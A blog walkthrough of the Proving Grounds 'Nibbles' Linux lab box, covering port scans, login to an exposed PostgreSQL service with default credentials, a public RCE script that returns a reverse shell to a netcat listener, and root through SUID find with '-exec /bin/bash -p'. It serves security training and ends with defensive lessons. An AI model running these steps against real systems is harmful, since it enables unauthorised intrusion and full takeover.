---
title: "Proving Grounds - Nibbles (Linux)"
date: 2026-02-25
description: "Proving Grounds Nibbles Linux walkthrough covering reconnaissance, initial access, and privilege escalation."
categories: [Proving Grounds, Linux]
tags: [postgresql, default-credentials, rce, suid, find, privilege-escalation]
mermaid: true
content_lang: en
alt_ja: /posts/pg-nibbles-ja/
---

## Overview

| Field | Value |
|---|---|
| OS | Linux |
| Difficulty | Not explicitly stated |
| Attack Surface | `21/tcp` FTP, `22/tcp` SSH, `80/tcp` HTTP, `5437/tcp` PostgreSQL |
| Primary Entry Vector | Default PostgreSQL credentials (`postgres:postgres`) on exposed DB service |
| Privilege Escalation Path | SUID `find` (`/usr/bin/find`) abused with GTFOBins |

## Credentials

| Username | Password | Context |
|---|---|---|
| `postgres` | `postgres` | PostgreSQL login on `5437/tcp` |

## Reconnaissance

### Fast Port Discovery with RustScan

The first objective is to identify all reachable TCP services before running heavier enumeration. RustScan is used for speed so we can quickly map the exposed surface and decide where to focus. At this point, we are specifically looking for unusual or high-value services such as databases exposed to the network.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[12:22][CPU:20][MEM:68][TUN0:192.168.45.166][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.178.47:21
Open 192.168.178.47:22
Open 192.168.178.47:80
Open 192.168.178.47:5437
[~] Starting Script(s)

```

💡 Why this works  
Fast discovery reduces time-to-enumeration and prevents missing non-standard services. The key finding here was `5437/tcp`, an uncommon PostgreSQL port, which became the primary attack path.

### Service and Version Enumeration with Nmap

After identifying open ports, the next step is to gather service versions and protocol details. `-sCV` and `-A` are used to combine default scripts, version detection, and richer fingerprints in a single run. We are looking for weak configurations and services that may allow direct authentication or command execution.

```bash
timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"
grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"
echo -e "\e[32mScan result saved to: $output_file\e[0m"
```

```bash
✅[12:22][CPU:18][MEM:67][TUN0:192.168.45.166][/home/n0z0]
🐉 > timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"

grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"

echo -e "\e[32mScan result saved to: $output_file\e[0m"
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-23 12:22 JST
Nmap scan report for 192.168.178.47
Host is up (0.085s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   84.67 ms 192.168.45.1
2   84.63 ms 192.168.45.254
3   84.76 ms 192.168.251.1
4   84.78 ms 192.168.178.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.62 seconds
Scan result saved to: /home/n0z0/work/scans/20260223-122259_192.168.178.47.xml

```

💡 Why this works  
Version-aware scanning connects open ports to actionable exploitation paths. In this case, exposed PostgreSQL combined with weak credentials enabled authenticated access and code execution through database features.

## Initial Foothold

### Authenticate to PostgreSQL with Default Credentials

The database service was directly reachable, so the quickest validation was a manual `psql` login attempt. The goal here is to verify whether weak or default credentials are accepted and whether the role has elevated privileges. Successful login with a superuser account immediately changes this from enumeration to exploitation.

```bash
psql -h $ip -p 5437 -U postgres
```

```bash
❌[2:55][CPU:4][MEM:65][TUN0:192.168.45.166][/home/n0z0]
🐉 > psql -h $ip -p 5437 -U postgres
ユーザー postgres のパスワード:
psql (17.6 (Debian 17.6-1)、サーバー 11.7 (Debian 11.7-0+deb10u1))
SSL接続(プロトコル: TLSv1.3、暗号化方式: TLS_AES_256_GCM_SHA384、圧縮: オフ、ALPN: なし)
"help"でヘルプを表示します。

postgres=#
```

💡 Why this works  
Default credentials remain one of the most common real-world failures. With PostgreSQL superuser access, dangerous features like `COPY ... PROGRAM` can execute OS commands in the database service context.

### Trigger OS Command Execution via PostgreSQL RCE Script

Once authenticated as a superuser, the next step is to execute an OS-level payload to establish a shell. The `PostgreSQL_RCE` helper script automates database-side command execution and callback behavior. At this stage, we are looking for an incoming connection on the attacker listener.

```bash
python3 postgresql_rce.py
```

```bash
✅[3:10][CPU:20][MEM:66][TUN0:192.168.45.166][...nd/Nibbles/PostgreSQL_RCE]
🐉 > python3 postgresql_rce.py
[!] Connected to the PostgreSQL database
[*] Executing the payload. Please check if you got a reverse shell!

```

The following command listens for the callback and validates remote code execution. After connection, the expected result is an interactive shell running as the database OS user.

```bash
nc -lvnp 80
```

```bash
❌[3:10][CPU:5][MEM:66][TUN0:192.168.45.166][/home/n0z0]
🐉 > nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.178.47] 45726
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### Capture `local.txt`

With shell access confirmed, the immediate objective is to prove user-level compromise by locating and reading the user flag. `find` is used to locate the file path quickly across the filesystem while suppressing noisy permission errors.

```bash
find / -iname local.txt 2>/dev/null
cat /home/wilson/local.txt
```

```bash
postgres@nibbles:/var/lib/postgresql/11/main$ find / -iname local.txt 2>/dev/null
/home/wilson/local.txt
postgres@nibbles:/var/lib/postgresql/11/main$ cat /home/wilson/local.txt
1beb5b3c9276ff5ba80a2128a85396d6
```

💡 Why this works  
PostgreSQL command execution runs under the `postgres` OS account, which is usually enough to enumerate local files and privilege-escalation vectors. Capturing `local.txt` confirms the foothold and validates practical impact.

## Privilege Escalation

### Enumerate SUID Binaries

Privilege escalation starts with identifying privileged binaries that can execute attacker-controlled commands. The enumeration output below highlights `find` with the SUID bit set, which is a known GTFOBins escalation path.

```bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 35K Jan  7  2019 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
-rwsr-xr-x 1 root root 154K Feb  2  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)

```

### Exploit SUID `find` to Obtain Root

The `find` GTFOBins method executes a command through `-exec` and spawns `bash -p`, which keeps elevated effective privileges. This is run directly from the compromised shell to transition from `postgres` to root. The expected result is successful reading of `/root/proof.txt`.

```bash
find . -exec /bin/bash -p \; -quit
cat /root/proof.txt
```

```bash
postgres@nibbles:/tmp$ find . -exec /bin/bash -p \; -quit
bash-5.0# cat /root/proof.txt
04102c714c890c2b14c6f3f2286e248d
bash-5.0#

```

💡 Why this works  
This is a classic GTFOBins privilege escalation. When `find` is SUID-root, `-exec` runs commands with elevated privileges, and `bash -p` preserves that effective UID instead of dropping it.

## Lessons Learned / Key Takeaways

- Database services exposed to untrusted networks should never allow default credentials.
- PostgreSQL superuser access is effectively OS command execution risk.
- High-signal local checks (SUID, sudo, capabilities) should be performed immediately after foothold.
- `find` with SUID is a direct root path and must be treated as critical misconfiguration.

```mermaid
flowchart LR
    subgraph SCAN["Scan"]
        direction TB
        S1["Rustscan / Nmap\n21,22,80,5437"]
        S2["vsftpd 3.0.3\nOpenSSH 7.9p1\nApache 2.4.38"]
        S3["PostgreSQL 11.7\nNon-standard port 5437"]
        S1 --> S2 --> S3
    end

    subgraph INITIAL["Initial Foothold"]
        direction TB
        I1["psql -h \$ip -p 5437 -U postgres\npostgres:postgres"]
        I2["PostgreSQL superuser\nOS command execution path"]
        I3["postgresql_rce.py\nReverse shell on port 80"]
        I4["cat /home/wilson/local.txt\n1beb5b3c9276ff5ba80a2128a85396d6"]
        I1 --> I2 --> I3 --> I4
    end

    subgraph PRIVESC["Privilege Escalation"]
        direction TB
        P1["SUID enumeration\n/usr/bin/find identified"]
        P2["GTFOBins find\n-exec /bin/bash -p"]
        P3["cat /root/proof.txt\n04102c714c890c2b14c6f3f2286e248d"]
        P1 --> P2 --> P3
    end

    SCAN --> INITIAL --> PRIVESC
```

## References

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- PostgreSQL_RCE: https://github.com/squid22/PostgreSQL_RCE
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins (`find`): https://gtfobins.org/gtfobins/find/
- GNU findutils: https://www.gnu.org/software/findutils/
